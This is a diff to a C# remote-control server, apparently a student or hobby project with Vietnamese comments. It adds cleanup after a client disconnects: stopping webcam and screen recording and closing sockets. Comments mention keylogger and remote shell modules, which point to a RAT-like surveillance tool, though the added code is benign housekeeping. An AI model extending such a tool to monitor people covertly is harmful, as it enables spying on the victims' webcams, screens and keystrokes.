@@ -85,6 +85,19 @@ namespace ServerApp
                         // Chuyển sang xử lý lệnh
                         HandleClientCommunication();
 
+                        // --- THÊM MỚI: Cleanup sau khi client quit/disconnect ---
+                        CleanupOnDisconnect();
+
+                        // --- THÊM MỚI: Close streams và socket để tránh leak ---
+                        try
+                        {
+                            Program.nw.Close();
+                            Program.nr.Close();
+                            Program.ns.Close();
+                            Program.client.Close();
+                        }
+                        catch { } // Ignore errors when closing
+
                     }
                     catch { }
                 }
@@ -126,7 +139,12 @@ namespace ServerApp
         public void receiveSignal(ref String s)
         {
             try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
-            catch { s = "QUIT"; }
+            catch 
+            { 
+                s = "QUIT"; 
+                // Tùy chọn: Log để debug
+                Console.WriteLine("[DEBUG] Client disconnected unexpectedly.");
+            }
         }
 
         // --- KHAI BÁO BIẾN TOÀN CỤC CHO MODULE SHELL (Đặt bên ngoài các hàm) ---
@@ -786,6 +804,34 @@ namespace ServerApp
                         return;
                 }
             }
+        }
+        
+        // Hàm cleanup khi client disconnect hoặc quit
+        private void CleanupOnDisconnect()
+        {
+            // Stop webcam recording nếu đang chạy
+            if (webcamCapture != null)
+            {
+                // Dừng recording và lưu file
+                webcamCapture.StopRecording();
+                
+                // Tùy chọn: Tắt camera để tiết kiệm tài nguyên
+                webcamCapture.TurnOff();
+            }
+
+            // Stop screen recording nếu đang chạy
+            if (screenCapture != null)
+            {
+                // Dừng recording và lưu file
+                screenCapture.StopRecording();
+                
+                // Tùy chọn: Tắt stream để tiết kiệm tài nguyên
+                screenCapture.StopStream();
+            }
+
+            // Tùy chọn: Reset các module khác nếu cần (ví dụ: keylogger, shell)
+            // if (tklog != null && tklog.IsAlive) { try { tklog.Abort(); } catch { } tklog = null; }
+            // ShellCurrentPath = "";
         }
     }
 }
